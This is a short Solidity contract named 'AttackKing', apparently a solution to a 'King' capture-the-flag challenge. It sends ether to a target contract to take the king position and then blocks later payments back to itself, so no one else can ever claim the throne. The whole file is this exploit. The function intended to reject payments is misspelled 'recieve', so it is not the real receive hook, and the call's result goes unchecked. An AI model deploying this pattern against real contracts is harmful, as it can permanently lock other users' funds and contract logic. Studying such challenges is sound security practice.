// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

contract AttackKing {
    constructor(address contractToAttack) payable {
        payable(contractToAttack).call{value: msg.value}("");
    }

    function recieve() external payable{
        revert();
    }
}
